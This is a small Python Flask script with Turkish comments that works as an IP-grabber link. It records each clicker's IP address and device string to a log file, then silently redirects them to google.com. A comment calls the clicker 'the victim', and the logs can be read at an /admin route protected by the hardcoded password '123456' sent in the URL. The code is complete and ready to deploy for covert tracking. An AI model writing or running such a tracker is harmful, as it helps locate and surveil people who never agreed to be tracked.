from flask import Flask, request, redirect, render_template_string
import os

app = Flask(__name__)

# --- AYARLAR ---
ADMIN_SIFRE = "123456"  # Buraya kendi şifreni yaz
LOG_DOSYASI = "loglar.txt"

@app.route('/')
def logger():
    # Tıklayanın bilgilerini kaydet
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.user_agent.string
    with open(LOG_DOSYASI, "a") as f:
        f.write(f"IP: {user_ip} | Cihaz: {user_agent}\n")
    
    # Kurbanı yönlendir
    return redirect("https://google.com")

@app.route('/admin')
def admin_paneli():
    # Linkin sonuna ?sifre=123456 eklenirse logları göster
    girilen_sifre = request.args.get('sifre')
    
    if girilen_sifre == ADMIN_SIFRE:
        if os.path.exists(LOG_DOSYASI):
            with open(LOG_DOSYASI, "r") as f:
                loglar = f.read()
            return f"<h1>Sistem Logları</h1><pre>{loglar}</pre>"
        else:
            return "Henüz log yok."
    else:
        return "Yetkisiz Erişim! Şifre yanlış.", 403

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)

